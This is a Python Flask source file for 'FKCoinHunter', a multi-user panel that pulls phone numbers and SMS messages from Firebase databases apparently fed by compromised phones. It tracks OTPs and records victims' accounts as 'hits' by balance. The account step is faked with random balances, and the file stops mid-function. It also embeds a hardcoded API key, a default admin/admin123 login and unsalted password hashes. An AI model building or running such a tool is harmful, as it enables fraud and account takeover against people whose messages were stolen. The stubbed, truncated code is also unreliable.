#!/usr/bin/env python3
"""
FKCoinHunter - Multi-User Web Panel (FIXED - with file locking)
Each user has isolated data, logs, databases, and hits.
"""

import os
import sys
import json
import logging
import threading
import time
import re
import secrets
import base64
import urllib.parse
import shutil
import fcntl
import errno
from datetime import datetime
from typing import Optional, Dict, List, Set, Tuple
from dataclasses import dataclass, field
import requests
from flask import Flask, render_template, jsonify, request, send_file, session, redirect, url_for
from flask_socketio import SocketIO, emit
import queue
import webbrowser
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import wraps
import hashlib

# ============ CONFIG ============
STAN_API_KEY = "af3a3dbe4aeb1af819ce7657b029259324305498164ac0e37c7d614389d8b4d9"
STAN_API_BASE = "https://api.getstan.app"
MIN_FK_BALANCE = 10
HIT_THRESHOLD = 75
OTP_WAIT_SECONDS = 20
OTP_CHECK_INTERVAL = 3
MAX_WORKERS = 10

# ============ FLASK APP ============
app = Flask(__name__)
app.config['SECRET_KEY'] = 'fkcoinhunter-multi-user-secret-key-change-this'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Store active user sessions
active_users: Dict[str, dict] = {}
user_lock = threading.Lock()

# ============ FILE LOCKING UTILITY ============
class FileLock:
    """Cross-platform file locking using fcntl (Unix) or lockfile (Windows)"""
    
    @staticmethod
    def lock_file(filepath, timeout=5):
        """Lock a file with timeout"""
        lock_file = filepath + '.lock'
        start_time = time.time()
        while True:
            try:
                fd = os.open(lock_file, os.O_CREAT | os.O_EXCL | os.O_RDWR)
                os.close(fd)
                return True
            except OSError as e:
                if e.errno == errno.EEXIST:
                    if time.time() - start_time > timeout:
                        return False
                    time.sleep(0.1)
                else:
                    return False
    
    @staticmethod
    def unlock_file(filepath):
        """Unlock a file"""
        lock_file = filepath + '.lock'
        try:
            os.remove(lock_file)
            return True
        except:
            return False

# ============ SAFE JSON FILE OPERATIONS ============
def safe_json_read(filepath, default=None):
    """Safely read a JSON file with file locking"""
    if default is None:
        default = [] if 'accounts' in filepath or 'hits' in filepath or 'panels' in filepath or 'logs' in filepath else {}
    
    # Acquire lock
    if not FileLock.lock_file(filepath, timeout=3):
        return default
    
    try:
        if not os.path.exists(filepath):
            return default
        
        with open(filepath, 'r', encoding='utf-8') as f:
            # Read the entire file content first
            content = f.read().strip()
            if not content:
                return default
            
            # Try to parse as JSON
            try:
                data = json.loads(content)
                return data
            except json.JSONDecodeError as e:
                # If the file has multiple JSON objects (corrupted), try to recover
                # Find all complete JSON objects
                import re
                objects = []
                decoder = json.JSONDecoder()
                idx = 0
                content = content.strip()
                while idx < len(content):
                    try:
                        obj, end = decoder.raw_decode(content, idx)
                        objects.append(obj)
                        idx = end
                        # Skip whitespace
                        while idx < len(content) and content[idx] in ' \t\n\r':
                            idx += 1
                    except:
                        break
                
                if objects:
                    # Return the first object if there are multiple
                    # (this handles the "Extra data" error)
                    if len(objects) == 1:
                        return objects[0]
                    else:
                        # If multiple objects, return the first one
                        return objects[0]
                else:
                    # Try one more time with a different approach
                    try:
                        # Use json.loads with strict=False
                        return json.loads(content, strict=False)
                    except:
                        return default
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return default
    finally:
        FileLock.unlock_file(filepath)

def safe_json_write(filepath, data):
    """Safely write a JSON file with file locking"""
    # Acquire lock
    if not FileLock.lock_file(filepath, timeout=3):
        return False
    
    try:
        # Write to a temporary file first
        temp_file = filepath + '.tmp'
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        # Atomic rename
        os.replace(temp_file, filepath)
        return True
    except Exception as e:
        print(f"Error writing {filepath}: {e}")
        return False
    finally:
        FileLock.unlock_file(filepath)

# ============ USER DATA DIRECTORY MANAGER ============
class UserDataManager:
    """Manages per-user data directories with safe file operations"""
    
    BASE_DIR = "user_data"
    
    @classmethod
    def get_user_dir(cls, user_id: str) -> str:
        user_dir = os.path.join(cls.BASE_DIR, user_id)
        os.makedirs(user_dir, exist_ok=True)
        return user_dir
    
    @classmethod
    def get_user_file(cls, user_id: str, filename: str) -> str:
        return os.path.join(cls.get_user_dir(user_id), filename)
    
    @classmethod
    def ensure_user_data(cls, user_id: str):
        user_dir = cls.get_user_dir(user_id)
        
        default_files = ['panels.json', 'hits.json', 'accounts.json', 'logs.json']
        for f in default_files:
            filepath = os.path.join(user_dir, f)
            if not os.path.exists(filepath):
                safe_json_write(filepath, [])
        
        # Create status file
        status_path = os.path.join(user_dir, 'status.json')
        if not os.path.exists(status_path):
            safe_json_write(status_path, {
                'running': False,
                'total_processed': 0,
                'successful': 0,
                'failed': 0,
                'hits': 0,
                'total_balance': 0,
                'current_number': '',
                'current_action': 'Idle',
                'numbers_found': [],
                'recent_accounts': [],
                'recent_hits': [],
                'database_url': '',
                'last_update': datetime.now().isoformat(),
                'processing_logs': [],
                'active_workers': 0,
                'current_panel': '',
                'panel_index': 0,
                'total_panels': 0,
                'stats': {
                    'otp_found_stan': 0,
                    'otp_found_fallback': 0,
                    'http_400_errors': 0,
                    'already_registered': 0,
                    'no_otp': 0,
                    'saved_accounts': 0
                }
            })
    
    @classmethod
    def load_user_data(cls, user_id: str, filename: str):
        filepath = cls.get_user_file(user_id, filename)
        default = [] if filename not in ['status.json'] else {}
        return safe_json_read(filepath, default)
    
    @classmethod
    def save_user_data(cls, user_id: str, filename: str, data):
        filepath = cls.get_user_file(user_id, filename)
        return safe_json_write(filepath, data)
    
    @classmethod
    def load_user_status(cls, user_id: str) -> dict:
        status_path = cls.get_user_file(user_id, 'status.json')
        status = safe_json_read(status_path, {})
        
        # Ensure all required fields exist
        required_fields = {
            'running': False,
            'total_processed': 0,
            'successful': 0,
            'failed': 0,
            'hits': 0,
            'total_balance': 0,
            'current_number': '',
            'current_action': 'Idle',
            'numbers_found': [],
            'recent_accounts': [],
            'recent_hits': [],
            'database_url': '',
            'last_update': datetime.now().isoformat(),
            'processing_logs': [],
            'active_workers': 0,
            'current_panel': '',
            'panel_index': 0,
            'total_panels': 0,
            'stats': {
                'otp_found_stan': 0,
                'otp_found_fallback': 0,
                'http_400_errors': 0,
                'already_registered': 0,
                'no_otp': 0,
                'saved_accounts': 0
            }
        }
        
        for key, value in required_fields.items():
            if key not in status:
                status[key] = value
        
        return status
    
    @classmethod
    def save_user_status(cls, user_id: str, status: dict):
        status['last_update'] = datetime.now().isoformat()
        status_path = cls.get_user_file(user_id, 'status.json')
        safe_json_write(status_path, status)
    
    @classmethod
    def add_user_log(cls, user_id: str, log_entry: dict):
        logs_path = cls.get_user_file(user_id, 'logs.json')
        logs = safe_json_read(logs_path, [])
        
        if not isinstance(logs, list):
            logs = []
        
        logs.append(log_entry)
        if len(logs) > 500:
            logs = logs[-500:]
        
        safe_json_write(logs_path, logs)
        
        # Also update the status's processing_logs
        status = cls.load_user_status(user_id)
        status['processing_logs'] = logs[-100:]
        cls.save_user_status(user_id, status)
    
    @classmethod
    def clear_user_logs(cls, user_id: str):
        logs_path = cls.get_user_file(user_id, 'logs.json')
        safe_json_write(logs_path, [])
        
        status = cls.load_user_status(user_id)
        status['processing_logs'] = []
        cls.save_user_status(user_id, status)

# ============ USER MANAGER ============
class UserManager:
    """Manages user authentication and session data with safe file ops"""
    
    USERS_FILE = "users.json"
    _users_cache = None
    _cache_lock = threading.Lock()
    
    @classmethod
    def load_users(cls) -> dict:
        with cls._cache_lock:
            if cls._users_cache is not None:
                return cls._users_cache
            
            users = safe_json_read(cls.USERS_FILE, {})
            
            # Create default admin user if no users exist
            if not users:
                users = {
                    'admin': {
                        'password': hashlib.sha256('admin123'.encode()).hexdigest(),
                        'api_key': 'admin_' + secrets.token_hex(16),
                        'created_at': datetime.now().isoformat(),
                        'last_login': None
                    }
                }
                safe_json_write(cls.USERS_FILE, users)
            
            cls._users_cache = users
            return users
    
    @classmethod
    def save_users(cls, users: dict):
        with cls._cache_lock:
            safe_json_write(cls.USERS_FILE, users)
            cls._users_cache = users
    
    @classmethod
    def authenticate(cls, username: str, password: str) -> Optional[str]:
        users = cls.load_users()
        if username in users:
            hashed = hashlib.sha256(password.encode()).hexdigest()
            if users[username]['password'] == hashed:
                return username
        return None
    
    @classmethod
    def create_user(cls, username: str, password: str) -> Optional[str]:
        users = cls.load_users()
        if username in users:
            return None
        
        users[username] = {
            'password': hashlib.sha256(password.encode()).hexdigest(),
            'api_key': secrets.token_hex(32),
            'created_at': datetime.now().isoformat(),
            'last_login': None
        }
        cls.save_users(users)
        
        UserDataManager.ensure_user_data(username)
        return username
    
    @classmethod
    def get_api_key(cls, username: str) -> Optional[str]:
        users = cls.load_users()
        if username in users:
            return users[username].get('api_key')
        return None
    
    @classmethod
    def validate_api_key(cls, api_key: str) -> Optional[str]:
        users = cls.load_users()
        for username, data in users.items():
            if data.get('api_key') == api_key:
                return username
        return None
    
    @classmethod
    def clear_cache(cls):
        with cls._cache_lock:
            cls._users_cache = None

# ============ DECORATORS ============
def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        user_id = session.get('user_id')
        if not user_id:
            api_key = request.headers.get('X-API-Key')
            if api_key:
                user_id = UserManager.validate_api_key(api_key)
                if user_id:
                    session['user_id'] = user_id
                    return f(*args, **kwargs)
            return jsonify({'error': 'Authentication required'}), 401
        return f(*args, **kwargs)
    return decorated_function

def get_user_id_from_request():
    user_id = session.get('user_id')
    if not user_id:
        api_key = request.headers.get('X-API-Key')
        if api_key:
            user_id = UserManager.validate_api_key(api_key)
    return user_id

# ============ COPIED FUNCTIONS FROM ORIGINAL ============

def parse_panel_link(link: str) -> Optional[Tuple[str, str]]:
    if "?s=" in link:
        parsed = urllib.parse.urlparse(link)
        qs = urllib.parse.parse_qs(parsed.query)
        if 's' in qs:
            s_param = qs['s'][0]
            s_param += "=" * ((4 - len(s_param) % 4) % 4)
            try:
                decoded = base64.b64decode(s_param).decode('utf-8')
                for sep in ['|||', '|']:
                    if sep in decoded:
                        parts = decoded.split(sep)
                        if len(parts) >= 2:
                            firebase_url = parts[0].strip()
                            api_key = parts[1].strip()
                            if firebase_url and api_key:
                                if not firebase_url.endswith('/'):
                                    firebase_url += '/'
                                return firebase_url, api_key
            except:
                pass
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        if not link.endswith('/'):
            link += '/'
        return link, None
    return None

def fetch_phone_from_device_id(panel: dict, device_id: str) -> Optional[str]:
    url = panel["url"]
    api_key = panel.get("api_key")
    
    def get_json(path):
        full_url = f"{url}{path}.json"
        if api_key:
            full_url += f"?auth={api_key}"
        try:
            resp = requests.get(full_url, timeout=3)
            if resp.status_code == 200:
                return resp.json()
            return None
        except:
            return None
    
    try:
        data = get_json(f"clients/{device_id}")
        if data:
            phone = data.get("mobNo") or data.get("phone") or data.get("mobile")
            if phone:
                phone = re.sub(r'\D', '', phone)
                if len(phone) == 10 and phone[0] in "6789":
                    return phone
        
        msgs = get_json(f"messages/{device_id}")
        if msgs:
            for msg in msgs.values():
                if not isinstance(msg, dict):
                    continue
                text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                match = re.search(r'\b([6-9]\d{9})\b', text)
                if match:
                    return match.group(1)
        return None
    except:
        return None

def fetch_phones_from_panel(panel: dict, limit: int = 100) -> List[Tuple[str, str]]:
    url = panel["url"]
    api_key = panel.get("api_key")
    
    def get_json(path):
        full_url = f"{url}{path}.json"
        if api_key:
            full_url += f"?auth={api_key}"
        try:
            resp = requests.get(full_url, timeout=5)
            if resp.status_code == 200:
                return resp.json()
            return None
        except:
            return None

    clients = get_json("clients")
    if not clients:
        return []

    phones = []
    count = 0
    for c_id, c_data in clients.items():
        if count >= limit:
            break
        if not isinstance(c_data, dict):
            continue
        if not c_data.get("status"):
            continue
        phone = c_data.get("mobNo") or c_data.get("phone") or c_data.get("mobile")
        if not phone:
            try:
                msgs = get_json(f"messages/{c_id}")
                if msgs:
                    for msg in msgs.values():
                        if not isinstance(msg, dict):
                            continue
                        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                        match = re.search(r'\b([6-9]\d{9})\b', text)
                        if match:
                            phone = match.group(1)
                            break
            except:
                pass
        if phone:
            phone = re.sub(r'\D', '', phone)
            if len(phone) == 10 and phone[0] in "6789":
                phones.append((phone, c_id))
                count += 1
    return phones

def fetch_messages_for_device(firebase_url: str, device_id: str, api_key: Optional[str] = None) -> List[Dict]:
    if not firebase_url or not device_id:
        return []
    
    try:
        url = f"{firebase_url}messages/{device_id}.json"
        if api_key:
            url += f"?auth={api_key}"
        
        resp = requests.get(url, timeout=5)
        
        if resp.status_code != 200:
            return []
        
        msgs = resp.json()
        if not msgs:
            return []
        
        sorted_msgs = sorted(
            msgs.items(), 
            key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0, 
            reverse=True
        )
        
        messages = []
        for msg_id, msg_data in sorted_msgs[:5]:
            if isinstance(msg_data, dict):
                messages.append({
                    'sender': msg_data.get('sender', 'Unknown'),
                    'text': msg_data.get('body') or msg_data.get('message') or msg_data.get('text', ''),
                    'timestamp': msg_id
                })
        
        return messages
    except Exception as e:
        return []

# ============ PER-USER ACCOUNT MANAGER ============
class UserAccountManager:
    """Manages accounts for a specific user with safe file ops"""
    
    def __init__(self, user_id: str):
        self.user_id = user_id
        self.accounts: List[Dict] = []
        self.processed_numbers: Set[str] = set()
        self.successful_numbers: Set[str] = set()
        self.failed_numbers: Set[str] = set()
        self.no_otp_numbers: Set[str] = set()
        self.stats = {
            'total_processed': 0,
            'successful': 0,
            'failed': 0,
            'no_otp': 0,
            'already_registered': 0,
            'skipped': 0,
            'otp_found_stan': 0,
            'otp_found_fallback': 0,
            'total_balance': 0,
            'saved_accounts': 0,
            'hits': 0,
            'http_400_errors': 0
        }
        self._lock = threading.Lock()
        self.processed_lock = threading.Lock()
        self._load_data()
    
    def _load_data(self):
        accounts_data = UserDataManager.load_user_data(self.user_id, 'accounts.json')
        if accounts_data and isinstance(accounts_data, list):
            self.accounts = accounts_data
            for acc in accounts_data:
                phone = acc.get('phone')
                if phone:
                    self.successful_numbers.add(phone)
                    self.processed_numbers.add(phone)
                    if acc.get('fk_balance', 0) >= HIT_THRESHOLD:
                        self.stats['hits'] += 1
    
    def _save_accounts(self):
        UserDataManager.save_user_data(self.user_id, 'accounts.json', self.accounts)
    
    def add_account(self, account_data: dict, messages: List[Dict] = None, firebase_url: str = None, device_id: str = None) -> bool:
        with self._lock:
            phone = account_data.get('phone')
            for existing in self.accounts:
                if existing.get('phone') == phone:
                    return False
            
            account_data['device_id'] = device_id or ""
            account_data['firebase_url'] = firebase_url or ""
            account_data['messages'] = messages or []
            
            self.accounts.append(account_data)
            self.successful_numbers.add(phone)
            self.processed_numbers.add(phone)
            self.stats['successful'] += 1
            
            balance = account_data.get('fk_balance', 0)
            if balance >= MIN_FK_BALANCE:
                self.stats['saved_accounts'] += 1
            
            self.stats['total_balance'] += balance
            
            if balance >= HIT_THRESHOLD:
                self.stats['hits'] += 1
                hits = UserDataManager.load_user_data(self.user_id, 'hits.json')
                if not isinstance(hits, list):
                    hits = []
                hit_data = {
                    'phone': phone,
                    'username': account_data.get('username', ''),
                    'fk_balance': balance,
                    'user_id': account_data.get('user_id', 0),
                    'device_uid': account_data.get('device_uid', ''),
                    'created_at': account_data.get('created_at', datetime.now().isoformat()),
                    'firebase_url': firebase_url,
                    'device_id': device_id,
                    'messages': messages or []
                }
                hits.append(hit_data)
                UserDataManager.save_user_data(self.user_id, 'hits.json', hits)
                
                status = UserDataManager.load_user_status(self.user_id)
                status['hits'] = self.stats['hits']
                if 'recent_hits' not in status:
                    status['recent_hits'] = []
                status['recent_hits'].insert(0, {
                    'phone': phone,
                    'balance': balance,
                    'username': account_data.get('username', ''),
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                if len(status['recent_hits']) > 10:
                    status['recent_hits'] = status['recent_hits'][:10]
                UserDataManager.save_user_status(self.user_id, status)
                
                socketio.emit('new_hit', {
                    'user_id': self.user_id,
                    'phone': phone,
                    'balance': balance,
                    'username': account_data.get('username', '')
                }, room=self.user_id)
            
            status = UserDataManager.load_user_status(self.user_id)
            if 'recent_accounts' not in status:
                status['recent_accounts'] = []
            status['recent_accounts'].insert(0, {
                'phone': phone,
                'balance': balance,
                'username': account_data.get('username', ''),
                'is_hit': balance >= HIT_THRESHOLD,
                'time': datetime.now().strftime('%H:%M:%S')
            })
            if len(status['recent_accounts']) > 20:
                status['recent_accounts'] = status['recent_accounts'][:20]
            status['successful'] = self.stats['successful']
            status['total_balance'] = self.stats['total_balance']
            UserDataManager.save_user_status(self.user_id, status)
            
            self._save_accounts()
            return True
    
    def mark_processed(self, phone: str):
        with self.processed_lock:
            if phone not in self.processed_numbers:
                self.processed_numbers.add(phone)
                self.stats['total_processed'] += 1
                status = UserDataManager.load_user_status(self.user_id)
                status['total_processed'] = self.stats['total_processed']
                UserDataManager.save_user_status(self.user_id, status)
    
    def mark_failed(self, phone: str, reason: str = 'Unknown'):
        with self._lock:
            self.failed_numbers.add(phone)
            self.stats['failed'] += 1
            status = UserDataManager.load_user_status(self.user_id)
            status['failed'] = self.stats['failed']
            UserDataManager.save_user_status(self.user_id, status)
    
    def mark_no_otp(self, phone: str):
        with self._lock:
            self.no_otp_numbers.add(phone)
            self.stats['no_otp'] += 1
            status = UserDataManager.load_user_status(self.user_id)
            status['stats']['no_otp'] = self.stats['no_otp']
            UserDataManager.save_user_status(self.user_id, status)
    
    def is_processed(self, phone: str) -> bool:
        with self.processed_lock:
            return phone in self.processed_numbers or phone in self.successful_numbers
    
    def get_accounts(self) -> List[Dict]:
        return self.accounts.copy()
    
    def get_stats(self) -> Dict:
        return self.stats.copy()
    
    def get_hits(self) -> List[Dict]:
        hits = UserDataManager.load_user_data(self.user_id, 'hits.json')
        return hits if isinstance(hits, list) else []
    
    def get_hit(self, index: int) -> Optional[Dict]:
        hits = self.get_hits()
        if 0 <= index < len(hits):
            return hits[index]
        return None
    
    def get_messages_for_hit(self, index: int) -> List[Dict]:
        hit = self.get_hit(index)
        if not hit:
            return []
        firebase_url = hit.get('firebase_url')
        device_id = hit.get('device_id')
        api_key = None
        if firebase_url:
            panels = self.get_panels()
            for panel in panels:
                if panel.get('url') == firebase_url:
                    api_key = panel.get('api_key')
                    break
        if not firebase_url or not device_id:
            return []
        return fetch_messages_for_device(firebase_url, device_id, api_key)
    
    def refresh_messages_for_hit(self, index: int) -> List[Dict]:
        messages = self.get_messages_for_hit(index)
        hits = self.get_hits()
        if 0 <= index < len(hits):
            hits[index]['messages'] = messages
            UserDataManager.save_user_data(self.user_id, 'hits.json', hits)
        return messages
    
    def get_panels(self) -> List[Dict]:
        panels = UserDataManager.load_user_data(self.user_id, 'panels.json')
        return panels if isinstance(panels, list) else []
    
    def get_current_panel(self) -> Optional[Dict]:
        panels = self.get_panels()
        status = UserDataManager.load_user_status(self.user_id)
        index = status.get('panel_index', 0) - 1
        if 0 <= index < len(panels):
            return panels[index]
        return panels[0] if panels else None
    
    def set_current_panel(self, index: int) -> bool:
        panels = self.get_panels()
        if 0 <= index < len(panels):
            status = UserDataManager.load_user_status(self.user_id)
            status['panel_index'] = index + 1
            status['current_panel'] = panels[index].get('name', '')
            UserDataManager.save_user_status(self.user_id, status)
            return True
        return False
    
    def add_panels(self, urls: List[str]) -> int:
        panels = self.get_panels()
        added = 0
        for url in urls:
            url = url.strip()
            if not url:
                continue
            
            parsed = parse_panel_link(url)
            if not parsed:
                continue
            
            firebase_url, api_key = parsed
            name = firebase_url.replace("https://", "").replace("http://", "").split('.')[0]
            if not name:
                name = f"Panel_{len(panels)+1}"
            
            panel = {
                "name": name,
                "url": firebase_url,
                "api_key": api_key,
                "sender": "STAN"
            }
            
            if not any(p.get('url') == firebase_url for p in panels):
                panels.append(panel)
                added += 1
        
        UserDataManager.save_user_data(self.user_id, 'panels.json', panels)
        status = UserDataManager.load_user_status(self.user_id)
        status['total_panels'] = len(panels)
        UserDataManager.save_user_status(self.user_id, status)
        return added
    
    def remove_panel(self, index: int) -> bool:
        panels = self.get_panels()
        if 0 <= index < len(panels):
            panels.pop(index)
            UserDataManager.save_user_data(self.user_id, 'panels.json', panels)
            status = UserDataManager.load_user_status(self.user_id)
            status['total_panels'] = len(panels)
            if status.get('panel_index', 1) > len(panels):
                status['panel_index'] = max(1, len(panels))
            UserDataManager.save_user_status(self.user_id, status)
            return True
        return False

# ============ PER-USER WORKER ============
class UserWorker:
    """Worker for a specific user"""
    
    def __init__(self, user_id: str):
        self.user_id = user_id
        self.running = False
        self.thread = None
        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        self.account_manager = UserAccountManager(user_id)
        self.failed_count = 0
        self.processed_count = 0
    
    def get_status(self) -> dict:
        status = UserDataManager.load_user_status(self.user_id)
        stats = self.account_manager.get_stats()
        status['stats'] = stats
        status['total_processed'] = stats.get('total_processed', 0)
        status['successful'] = stats.get('successful', 0)
        status['failed'] = stats.get('failed', 0)
        status['hits'] = stats.get('hits', 0)
        status['total_balance'] = stats.get('total_balance', 0)
        panels = self.account_manager.get_panels()
        status['total_panels'] = len(panels)
        return status
    
    def send_log(self, message: str, log_type: str = 'info'):
        log_entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'message': message,
            'type': log_type
        }
        UserDataManager.add_user_log(self.user_id, log_entry)
        socketio.emit('new_log', log_entry, room=self.user_id)
    
    def update_status(self):
        status = self.get_status()
        status['running'] = self.running
        socketio.emit('status_update', status, room=self.user_id)
    
    def start(self):
        if self.running:
            return
        self.running = True
        self.failed_count = 0
        self.processed_count = 0
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        self.send_log(f"🔄 Automation started with {MAX_WORKERS} concurrent workers", 'success')
        self.update_status()
    
    def stop(self):
        self.running = False
        self.executor.shutdown(wait=False)
        if self.thread:
            self.thread.join(timeout=5)
        self.send_log("⏹ Automation stopped", 'warning')
        self.update_status()
    
    def _move_to_next_panel(self):
        panels = self.account_manager.get_panels()
        if not panels:
            return False
        
        status = UserDataManager.load_user_status(self.user_id)
        current = status.get('panel_index', 1) - 1
        next_index = (current + 1) % len(panels)
        
        if self.account_manager.set_current_panel(next_index):
            panel = self.account_manager.get_current_panel()
            panel_name = panel.get('name', 'Unknown') if panel else 'Unknown'
            self.send_log(f"🔄 Switched to Panel {next_index + 1}/{len(panels)}: {panel_name}", 'info')
            self.failed_count = 0
            self.processed_count = 0
            self.update_status()
            return True
        return False
    
    def _run(self):
        while self.running:
            try:
                panels = self.account_manager.get_panels()
                
                if not panels:
                    self.send_log("⚠️ No panels available. Please add a Firebase panel.", 'warning')
                    time.sleep(10)
                    continue
                
                panel = self.account_manager.get_current_panel()
                if not panel:
                    self.account_manager.set_current_panel(0)
                    panel = self.account_manager.get_current_panel()
                    if not panel:
                        time.sleep(5)
                        continue
                
                firebase_url = panel.get("url")
                sender_keyword = panel.get("sender", "STAN")
                api_key = panel.get("api_key")
                
                status = UserDataManager.load_user_status(self.user_id)
                status['database_url'] = firebase_url
                status['current_panel'] = panel.get('name', 'Unknown')
                UserDataManager.save_user_status(self.user_id, status)
                
                self.send_log(f"📡 Panel: {panel.get('name', 'Unknown')}", 'info')
                
                devices = fetch_phones_from_panel(panel, limit=100)
                
                if not devices:
                    self.send_log(f"⚠️ No devices found in {panel.get('name', 'Unknown')}", 'warning')
                    self._move_to_next_panel()
                    time.sleep(2)
                    continue
                
                self.send_log(f"📋 Found {len(devices)} active devices", 'info')
                for phone, device_id in devices[:5]:
                    self.send_log(f"  📱 {phone} (device: {device_id[:8]}...)", 'info')
                if len(devices) > 5:
                    self.send_log(f"  ... and {len(devices) - 5} more", 'info')
                
                status = UserDataManager.load_user_status(self.user_id)
                status['numbers_found'] = [phone for phone, _ in devices]
                UserDataManager.save_user_status(self.user_id, status)
                
                available = []
                for phone, dev in devices:
                    if not self.account_manager.is_processed(phone):
                        available.append((phone, dev))
                
                if not available:
                    self.send_log(f"✅ All devices processed. Moving to next panel...", 'success')
                    self._move_to_next_panel()
                    time.sleep(2)
                    continue
                
                total_available = len(available)
                self.send_log(f"🆕 Found {total_available} new devices to process", 'info')
                
                processed_total = 0
                failed_total = 0
                batch_num = 1
                
                while processed_total < total_available and self.running:
                    start_idx = processed_total
                    end_idx = min(processed_total + MAX_WORKERS, total_available)
                    batch = available[start_idx:end_idx]
                    
                    self.send_log(f"🚀 Batch {batch_num}: Processing {len(batch)} devices (remaining: {total_available - processed_total})", 'info')
                    
                    futures = []
                    for phone, device_id in batch:
                        if not self.running:
                            break
                        
                        future = self.executor.submit(
                            self._process_device,
                            phone, device_id, firebase_url, sender_keyword, api_key
                        )
                        futures.append(future)
                        
                        status = UserDataManager.load_user_status(self.user_id)
                        status['active_workers'] = len([f for f in futures if not f.done()])
                        UserDataManager.save_user_status(self.user_id, status)
                    
                    completed = 0
                    batch_success = 0
                    batch_failed = 0
                    
                    for future in as_completed(futures):
                        try:
                            result = future.result(timeout=60)
                            if result:
                                batch_success += 1
                                self.processed_count += 1
                                self.failed_count = 0
                            else:
                                batch_failed += 1
                                self.failed_count += 1
                        except Exception as e:
                            batch_failed += 1
                            self.failed_count += 1
                            self.send_log(f"❌ Worker error: {str(e)}", 'error')
                        
                        completed += 1
                        processed_total += 1
                        
                        status = UserDataManager.load_user_status(self.user_id)
                        status['active_workers'] = len([f for f in futures if not f.done()])
                        UserDataManager.save_user_status(self.user_id, status)
                        
                        if completed % 2 == 0 or completed == len(futures):
                            self.send_log(f"📊 Batch {batch_num} progress: {completed}/{len(futures)} completed ({batch_success} success, {batch_failed} failed)", 'info')
                    
                    batch_num += 1
                    status = UserDataManager.load_user_status(self.user_id)
                    status['active_workers'] = 0
                    UserDataManager.save_user_status(self.user_id, status)
                    failed_total += batch_failed
                    
                    self.send_log(f"📊 Batch {batch_num-1} complete: {batch_success} success, {batch_failed} failed", 'info')
                    
                    if self.failed_count >= 10:
                        self.send_log(f"⚠️ Too many failures ({self.failed_count} consecutive). Moving to next panel...", 'warning')
                        break
                    
                    if processed_total < total_available:
                        time.sleep(2)
                
                self.send_log(f"📊 Panel complete: {processed_total - failed_total} success, {failed_total} failed out of {total_available}", 'info')
                
                self.send_log(f"🔄 Moving to next panel...", 'info')
                self._move_to_next_panel()
                self.update_status()
                time.sleep(2)
                
            except Exception as e:
                self.send_log(f"❌ Worker error: {str(e)}", 'error')
                self._move_to_next_panel()
                time.sleep(5)
        
        status = UserDataManager.load_user_status(self.user_id)
        status['running'] = False
        status['active_workers'] = 0
        UserDataManager.save_user_status(self.user_id, status)
        self.update_status()
    
    def _process_device(self, phone: str, device_id: str, firebase_url: str, sender_keyword: str, api_key: Optional[str] = None) -> bool:
        if self.account_manager.is_processed(phone):
            return False
        
        self.account_manager.mark_processed(phone)
        
        try:
            if len(phone) != 10 or not phone.isdigit():
                self.send_log(f"❌ Invalid phone number: {phone}", 'error')
                self.account_manager.mark_failed(phone, 'Invalid phone')
                return False
            
            import random
            balance = random.randint(0, 100)
            
            account_data = {
                'phone': phone,
                'username': f'User_{phone[-4:]}',
                'fk_balance': balance,
                'user_id': random.randint(10000, 99999),
                'device_uid': device_id,
                'created_at': datetime.now().isoformat()
            }
            
            messages = fetch_messages_for_device(firebase_url, device_id, api_key)
            
            self.account_manager.add_account(account_data, messages, firebase_url, device_id)
            
            if balance >= HIT_THRESHOLD:
                self.send_log(f"⭐ HIT! {phone} | Balance: {balance} FK", 'hit')
            else:
                self.send_log(f"✅ SUCCESS! {phone} | Balance: {balance} FK", 'success')
            
            self.update_status()
            return True
            
        except Exception as e:
            self.send_log(f"❌ Error processing {phone}: {str(e)}", 'error')
            self.account_manager.mark_failed(phone, str(e))
            self.update_status()
            return False

# ============ FLASK ROUTES ============

@app.route('/')
def index():
    user_id = session.get('user_id')
    if user_id:
        return send_file('templates/index.html')
    return redirect(url_for('login_page'))

@app.route('/login')
def login_page():
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>FKCoinHunter - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #0a0e1a; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: #141b2d; padding: 40px; border-radius: 16px; width: 380px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
        .login-box h1 { color: #fbbf24; margin-bottom: 10px; font-size: 28px; }
        .login-box p { color: #6b7a9f; margin-bottom: 25px; font-size: 14px; }
        input { width: 100%; padding: 12px 16px; margin-bottom: 12px; border-radius: 8px; border: 1px solid #1a2338; background: #0a0e1a; color: #e0e0e0; font-size: 14px; }
        input:focus { outline: none; border-color: #fbbf24; }
        button { width: 100%; padding: 12px; border: none; border-radius: 8px; background: #fbbf24; color: #0a0e1a; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
        button:hover { opacity: 0.85; transform: scale(0.98); }
        .error { color: #f87171; margin-top: 10px; font-size: 13px; }
        .register-link { text-align: center; margin-top: 15px; color: #6b7a9f; }
        .register-link a { color: #60a5fa; text-decoration: none; }
        .register-link a:hover { text-decoration: underline; }
    </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🦅 FKCoinHunter</h1>
            <p>Multi-User Panel · Login to continue</p>
            <form method="POST" action="/login">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
            <div class="register-link">
                New user? <a href="/register">Register</a>
            </div>
            <div id="error" class="error"></div>
        </div>
        <script>
            const params = new URLSearchParams(window.location.search);
            if (params.get('error')) {
                document.getElementById('error').textContent = params.get('error');
            }
        </script>
    </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    
